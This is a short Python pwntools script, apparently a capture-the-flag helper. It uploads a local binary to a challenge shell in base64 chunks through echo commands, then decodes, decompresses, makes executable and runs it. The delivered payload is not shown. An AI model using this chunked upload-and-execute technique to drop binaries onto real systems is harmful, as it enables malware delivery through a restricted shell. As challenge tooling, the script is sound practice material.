import pwn
import base64
import itertools
from pathlib import Path

pwn.context.arch = "amd64"

# Encode a gzip encoded payload in base64 and
# split it in chunks of 800 characters.
# so we can send them in individual commands.
payload = Path("payload").read_bytes()
payload_encoded = base64.b64encode(payload)
chunks = itertools.batched(payload_encoded, 800)
print(f"Binary Encoded Len: {len(payload_encoded)}")

with pwn.process("/challenge/run.sh") as target:
    target.recvuntil(b"~ # ")

    # This is super slow, but we send each chunk and wait for
    # the terminal echoing it back to us.
    for chunk in chunks:
        print(f"Sending chunk... of size {len(chunk)}")
        target.sendline(b"echo -n \"" + bytes(chunk) + b"\" >> ./binary_encoded")
        data  = target.recvuntil(b"~ # ")
        print(data.decode())

    # Flexing to make sure that we sent the full binary.
    target.sendline(b"wc -c ./binary_encoded")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Base 64 decode the file into a gzip file.
    target.sendline(b"base64 -d < ./binary_encoded > ./binary.gz")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Decompress the file.
    target.sendline(b"gunzip ./binary.gz")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Make it executable.
    target.sendline(b"chmod ugo+rx ./binary")
    data = target.recvuntil(b"~ # ")
    print(data.decode())

    # Run it!
    target.sendline(b"./binary")
    data = target.recvuntil(b"~ # ")
    print(data.decode())
